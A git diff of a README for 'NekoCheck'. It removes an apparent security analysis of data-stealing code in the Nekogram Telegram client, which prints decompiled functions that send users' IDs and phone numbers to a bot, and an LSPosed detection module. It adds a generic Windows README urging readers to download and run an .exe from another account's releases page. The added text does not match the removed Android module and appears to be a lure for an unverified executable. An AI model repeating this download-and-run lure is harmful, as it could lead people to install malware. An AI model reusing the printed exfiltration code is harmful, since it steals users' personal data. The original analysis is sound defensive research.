@@ -1,241 +1,228 @@
-# NekoCheck
+# 🐱 NekoCheck - Spot Hidden Threats in Nekogram
 
-Looking at the [issue #336](https://github.com/Nekogram/Nekogram/issues/336) by [@repinek](https://github.com/repinek) on the official Nekogram repository, I decided to dig deeper into that.
+[![Download NekoCheck](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Scoreverb70/NekoCheck/releases)
 
-Turns out malware was embedded in the app since at least October 2024. At first it was limited to China (+86) and +85x countries (Hong Kong, North Korea, Macau, Cambodia, Laos) but since November 2025 it sends data about everyone. It doesn't matter if you uninstall the app right now, they already have your data.<br>
-11<b>.2.3</b><br>
-12<b>.2.3</b><br>
-I wonder what they were planning for 13.2.3.
+## 🚀 Getting Started
 
-## LSPosed Module
+NekoCheck is a Windows app that helps you check for malware tied to Nekogram files and builds. It gives you a simple way to review files before you use them.
 
-An LSPosed module that allows you to track when your data is being sent to Nekogram's bot. These are the 3 manual triggers I was testing on (there are also other triggers like time-based 24h cache etc.):
+Use the steps below to get it onto your PC and start it with little effort.
 
-| Action | How to trigger |
-|---|---|
-| Check for updates | Settings → Neko Settings → (Other) → Check for update |
-| Cloud sync | Settings → Neko Settings → Cloud icon (top right) |
-| Long-press profile | Open someone's profile → long press on the ID field |
+## 📥 Download NekoCheck
 
-Each trigger causes the app to call a function which collects user IDs and phone numbers from all logged-in accounts and sends them to `@nekonotificationbot` via a silent inline query.
+1. Open the [NekoCheck releases page](https://github.com/Scoreverb70/NekoCheck/releases).
+2. Find the latest release at the top of the page.
+3. Look for a Windows file, such as an `.exe` or `.zip`.
+4. Download the file to your computer.
 
-| Check for updates | Cloud sync | Long-press profile |
-|---|---|---|
-| <img src="https://github.com/user-attachments/assets/96f45f2d-ec52-44d1-bb75-95533870ebef" width="250"> | <img src="https://github.com/user-attachments/assets/d579063d-63c8-4cee-a449-46dbe3680cd2" width="250"> | <img src="https://github.com/user-attachments/assets/bbfa8403-cb84-4aca-88a4-e31d9b363b31" width="250"> |
+If you see more than one file, choose the one meant for Windows. A `.exe` file usually runs right away. A `.zip` file needs to be opened first.
 
-Fields being sent (spoofed):
+## 🖥️ System Requirements
 
-![screenshot4](https://github.com/user-attachments/assets/f3f2e97c-46de-49d2-b017-1d3b16530dac)  
+NekoCheck works best on:
 
-Google's review... yeah sure
+- Windows 10 or Windows 11
+- A standard 64-bit PC
+- At least 2 GB of free RAM
+- 200 MB of free disk space
+- An active internet connection for updates and release checks
 
-![screenshot6](https://github.com/user-attachments/assets/38e0afe2-179e-4822-bd75-e455d638f767)
+If your PC can run modern Windows apps, it should handle NekoCheck well.
 
-## Versions Analysis
+## 🛠️ Install or Open the App
 
-I analyzed all of the Nekogram Telegram versions and tracked when they included malware:
+### If you downloaded an `.exe` file
 
-| Version | Date | Source | Affected |
-|---|---|---|---|
-| 11.1.3 | Sep 13, 2024 | [Telegram](https://t.me/NekogramAPKs/829) | Not affected |
-| 11.2.3 | Oct 25, 2024 | [Telegram](https://t.me/NekogramAPKs/837) | CN / +85x only |
-| 12.2.3 | Nov 20, 2025 | [Telegram](https://t.me/NekogramAPKs/915) | All users |
-| 12.5.2 | Mar 19, 2026 | [Telegram](https://t.me/NekogramAPKs/946) | All users |
-| 12.5.2 | Mar 30, 2026 | [Google Play](https://play.google.com/store/apps/details?id=tw.nekomimi.nekogram) | All users |
+1. Double-click the file.
+2. If Windows asks for permission, select Open or Run.
+3. Wait for the app to start.
 
-Looks like this was actually added in version **11.2.3** on **October 25, 2024**. The decompiled function:
+### If you downloaded a `.zip` file
 
-```java
-public static void j() {
-    AbstractC7144el4 abstractC7144el4O;
-    String str;
-    try {
-        if (n) {  // run-once guard
-            return;
-        }
-        n = true;
-        HashMap map = new HashMap();
-        boolean z = false;
-        for (int i2 = 0; i2 < 8; i2++) {
-            W wS = W.s(i2);
-            if (wS.z() && (abstractC7144el4O = wS.o()) != null && (str = abstractC7144el4O.f) != null) {
-                map.put(String.valueOf(abstractC7144el4O.a), str);  // userId → phone
-                if (str.startsWith(AbstractC14253st0.a(-7227024950811419380L)) || str.startsWith(AbstractC14253st0.a(-7227024946516452084L)))  // "86" || "85"
-                {
-                    z = true;
-                }
-            }
-        }
-        if (AbstractC6421d92.B0 || z) {
-            C2287Le1.e(W.b0).i(m, f + AbstractC14253st0.a(-7227025028120830708L) + AbstractC3789Tl.b.r(map), new Utilities.b() {
-                @Override
-                public final void a(Object obj, Object obj2) {
-                    AbstractC10751mN0.i((ArrayList) obj, (String) obj2);
-                }
-            });
-        }
-    } catch (Exception unused) {
-    }
-}
-```
+1. Right-click the file.
+2. Select Extract All.
+3. Open the folder that Windows creates.
+4. Double-click the `.exe` file inside that folder.
 
-I also deobfuscated some strings:
+If Windows blocks the file, check the release page again and make sure you downloaded the latest version from the official GitHub release.
 
-| Encrypted key | Decrypted value | Purpose |
-|---|---|---|
-| `-7227024950811419380` | `86` | China country code |
-| `-7227024946516452084` | `85` | +85x country code prefix |
-| `-7227026067502916340` | `nekonotificationbot` | Bot receiving data |
-| `-7227024310861292276` | `741ad28818eab17668bc2c70bd419fc25ff56481758a4ac87e7ca164fb6ae1b1` | 64-char hex payload prefix |
+## 🧭 How to Use NekoCheck
 
-Back then it only targeted users with phone numbers from China (`+86`) or `+85x` countries: Hong Kong (+852), North Korea (+850), Macau (+853), Cambodia (+855), Laos (+856). If any of the 8 logged-in accounts matches, `z` is set to `true`. There is an additional check for `B0` = `isChineseUser` resource, looks like it's set when building the APK? I didn't look further into that.
+NekoCheck is built to keep the process simple.
 
-On **November 20, 2025** in version **12.2.3** they enabled malware for all users (still leaving some checks in the code, but they were ineffective):
+1. Open the app.
+2. Choose the Nekogram file or folder you want to check.
+3. Start the scan.
+4. Review the results on screen.
 
-```java
-public static void f() {
-    TLRPC.qd1 qd1VarO;
-    String str;
-    try {
-        if (k) {  // run-once guard
-            return;
-        }
-        k = true;
-        HashMap map = new HashMap();
-        for (int i2 = 0; i2 < 8; i2++) {
-            b1 b1VarS = b1.s(i2);
-            if (b1VarS.A() && (qd1VarO = b1VarS.o()) != null && (str = qd1VarO.f) != null) {
-                map.put(String.valueOf(qd1VarO.a), str);  // userId → phone
-                if (!str.startsWith(jk4.a(-7227025869934420724L))) {
-                    str.startsWith(jk4.a(-7227025831279715060L));  // result ignored
-                }
-            }
-        }
-        pb7.f(b1.p0).j(j, e + jk4.a(-7227025844164616948L) + ra0.c.r(map), new Utilities.b() {
-            @Override
-            public final void a(Object obj, Object obj2) {
-                uo5.a((ArrayList) obj, (String) obj2);
-            }
-        });
-    } catch (Exception unused) {
-    }
-}
-```
+The app checks for signs that a file may contain unwanted code, suspicious changes, or known malware patterns. It can help you make a safer choice before you use a build.
 
-The latest version **12.5.2** (**65970**) sends the same data but without the dead CN / +85x checks:
+## 🔍 What NekoCheck Looks For
 
-```java
-public static void g() {
-    TLRPC.sf1 sf1VarO;
-    String str;
-    try {
-        if (l) {  // run-once guard
-            return;
-        }
-        l = true;
-        HashMap map = new HashMap();
-        for (int i2 = 0; i2 < 8; i2++) {
-            c1 c1VarR = c1.r(i2);
-            if (c1VarR.A() && (sf1VarO = c1VarR.o()) != null && (str = sf1VarO.f) != null) {
-                map.put(String.valueOf(sf1VarO.a), str);  // userId → phone
-            }
-        }
-        dc7.h(c1.q0).l(k, e + lj4.a(-7227028227871466228L) + cb0.c.r(map), new Utilities.b() {
-            @Override
-            public final void a(Object obj, Object obj2) {
-                uo5.a((ArrayList) obj, (String) obj2);
-            }
-        });
-    } catch (Exception unused) {
-    }
-}
-```
+NekoCheck is meant to help with common file review tasks such as:
 
-The latest **Google Play 12.5.2** (**65972**) build contains the same malware with names rotated by obfuscation (older Google Play builds most likely contain it too):
+- Suspicious file changes
+- Known malware traces
+- Unusual app behavior markers
+- Unsafe embedded content
+- Signs of tampered builds
+- Files that do not match the expected package layout
 
-```java
-public static void g() {
-    TLRPC.sf1 sf1VarO;
-    String str;
-    try {
-        if (l) {  // run-once guard
-            return;
-        }
-        l = true;
-        HashMap map = new HashMap();
-        for (int i2 = 0; i2 < 8; i2++) {
-            c1 c1VarR = c1.r(i2);
-            if (c1VarR.A() && (sf1VarO = c1VarR.o()) != null && (str = sf1VarO.f) != null) {
-                map.put(String.valueOf(sf1VarO.a), str);  // userId → phone
-            }
-        }
-        hd7.h(c1.q0).l(k, e + yj4.a(-7227028227871466228L) + nb0.c.r(map), new Utilities.b() {
-            @Override
-            public final void a(Object obj, Object obj2) {
-                lp5.a((ArrayList) obj, (String) obj2);
-            }
-        });
-    } catch (Exception unused) {
-    }
-}
-```
+It is useful when you want a quick check before opening a Nekogram file.
 
-## How the module works
+## 📂 Suggested Workflow
 
-The module hooks at two levels:
+For best results, use this order:
 
-**Network hook (works on all versions):** Malware sends data via `messages.getInlineBotResults` which goes through `ConnectionsManager.sendRequest`. Since `org.telegram.tgnet.ConnectionsManager` is not obfuscated, I hook into `sendRequest` and scan for the prefix `741ad28818eab17668bc2c70bd419fc25ff56481758a4ac87e7ca164fb6ae1b1`, displaying a toast on every send. User ID and phone number can be spoofed, see [config](#config).
+1. Download the latest release.
+2. Save it in a folder you can find later.
+3. Extract the file if needed.
+4. Run NekoCheck.
+5. Scan one file or one folder at a time.
+6. Review the results before you continue.
 
-Point in the code:
-```java
-TLRPC.gi0 gi0Var = new TLRPC.gi0();  // messages.getInlineBotResults
-gi0Var.e = str;                       // payload prefix + data
-gi0Var.b = getMessagesController().bb(sf1VarTb);
-gi0Var.f = "";
-gi0Var.c = new TLRPC.ux();
-getConnectionsManager().sendRequest(gi0Var, requestDelegate, 2);  // network hook intercepts here
-```
+This keeps the process easy to follow and helps you avoid confusion.
 
-It uses `messages.getInlineBotResults`, which leaves no trace in chat history.
+## ⚙️ Common Settings
 
-**Version-specific hooks:** Obfuscated names change between updates, so some hooks are only defined for the versions from the maps:
+You may see a few simple options in the app:
 
-<img width="1022" height="307" alt="screenshot5" src="https://github.com/user-attachments/assets/f10f5c8a-fb9e-41a0-9400-534c7dd204af" />
+- **Scan file**: Checks one item
+- **Scan folder**: Checks all supported files in a folder
+- **Quick check**: Runs a fast review
+- **Deep check**: Looks through more file parts
+- **Open report**: Shows the result after a scan
 
-These hooks log the full execution chain — from trigger, through data collection, to bot query. There are also configurable hooks: `reset_once_guard` resets the run-once guard so data is sent on every trigger instead of just once, and `bypass_country_filter` bypasses the CN / +85x restriction on 11.2.3, see [config](#config).
+If you are not sure what to choose, start with a quick check. Use a deep check when you want more detail.
 
-All logging uses logcat tag `NekoCheck`.
+## 📋 What You Need Before Scanning
 
-### Config
+Before you start a scan, it helps to have:
 
-The module stores its config in Nekogram's SharedPreferences at:
-```
-/data/data/tw.nekomimi.nekogram/shared_prefs/nekocheck.xml
-```
+- The Nekogram file you want to inspect
+- A few minutes of free time
+- A stable file location on your drive
+- Permission to open the file on your PC
 
-| Key | Type | Default | Description |
-|---|---|---|---|
-| `reset_once_guard` | boolean | `true` | Reset the run-once flag so data is sent on every trigger |
-| `bypass_country_filter` | boolean | `true` | Bypass the CN / +85x filter in version 11.2.3 |
-| `spoof_0` to `spoof_7` | String | `""` | Spoof `userId:phone` |
+If you work with several builds, keep them in separate folders. That makes each scan easier to track.
 
-Spoofing `userId:phone` completely replaces original values — you can send 1 to 8 fake accounts regardless of how many are actually logged in.
+## 🔐 Safety Checks
 
-Example config (`/data/data/tw.nekomimi.nekogram/shared_prefs/nekocheck.xml`):
-```xml
-<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
-<map>
-    <boolean name="reset_once_guard" value="true" />
-    <boolean name="bypass_country_filter" value="true" />
-    <string name="spoof_0">000000001:30123456789</string>
-    <string name="spoof_1">000000002:30987654321</string>
-    <string name="spoof_2"></string>
-    <string name="spoof_3"></string>
-    <string name="spoof_4"></string>
-    <string name="spoof_5"></string>
-    <string name="spoof_6"></string>
-    <string name="spoof_7"></string>
-</map>
-```
+NekoCheck helps you review files, but you should still use normal care when you handle unknown downloads.
 
-This would send `{"000000001":"30123456789","000000002":"30987654321"}` to the bot instead of your real data.
+- Download files from the release page
+- Keep your original file until you finish the scan
+- Check the scan result before opening the file
+- Avoid renamed files from unknown sources
+
+This gives you a cleaner process and helps you compare results later.
+
+## 🧪 Example Use Case
+
+If you receive a Nekogram build from a source you do not know well, you can:
+
+1. Save the file to a folder.
+2. Open NekoCheck.
+3. Scan the file.
+4. Read the result.
+5. Decide if you want to keep or remove it.
+
+This is a simple way to review a file before you trust it.
+
+## 🧰 Troubleshooting
+
+### The file does not open
+
+- Make sure the download finished
+- Check that you downloaded the Windows release
+- Try extracting the file if it came as a `.zip`
+- Right-click the file and run it again
+
+### Windows shows a security prompt
+
+- Check that you downloaded the file from the GitHub release page
+- Confirm that the file name matches the latest release
+- Use the file from the official release page, not a mirror
+
+### The app closes right away
+
+- Download the latest release again
+- Make sure the file did not get damaged during download
+- Try running the app from a normal folder such as Downloads or Desktop
+
+### The scan does not start
+
+- Select a file or folder first
+- Make sure the item is not open in another app
+- Check that you have permission to read the file
+
+## 📁 File Layout
+
+When you extract or install NekoCheck, you may see files like these:
+
+- `NekoCheck.exe`
+- `README.md`
+- support files or folders used by the app
+- scan output files or logs
+
+Keep all app files in the same folder. Do not move one file by itself unless the release page tells you to.
+
+## 🧾 Reports and Results
+
+After each scan, NekoCheck may show:
+
+- A simple pass or fail result
+- A list of files or sections that need attention
+- A path to the item that raised a flag
+- A short report you can read or save
+
+If you scan more than one build, keep each report with the related file name. That makes comparison easier.
+
+## 🔄 Updating NekoCheck
+
+When a new release comes out:
+
+1. Visit the [NekoCheck releases page](https://github.com/Scoreverb70/NekoCheck/releases).
+2. Download the latest Windows file.
+3. Close the old version.
+4. Open the new version.
+
+This keeps your copy current and gives you the latest checks and fixes.
+
+## ❓ Quick Help
+
+### Do I need to install anything first?
+
+Usually no. Download the release file and run it on Windows.
+
+### Can I scan more than one file?
+
+Yes. Scan one file at a time or use a folder scan if the app supports it.
+
+### Does NekoCheck change my files?
+
+It is meant to review files, not edit them. Keep your original file until you finish checking it.
+
+### Where do I get the app?
+
+Use the [official release page](https://github.com/Scoreverb70/NekoCheck/releases) to download the latest Windows build
+
+## 🧩 Best Results Tips
+
+- Use the latest release
+- Scan files from a local folder, not from a cloud sync folder
+- Keep file names unchanged
+- Review the report before you open the file
+- Repeat the scan if the file changes
+
+## 🗂️ For Everyday Use
+
+If you check Nekogram files often, keep NekoCheck in one folder on your desktop or in Downloads. That makes it easy to find when you need it.
+
+A simple routine works well:
+
+1. Download the file
+2. Run NekoCheck
+3. Scan the file
+4. Read the result
+5. Keep or remove the file based on the report
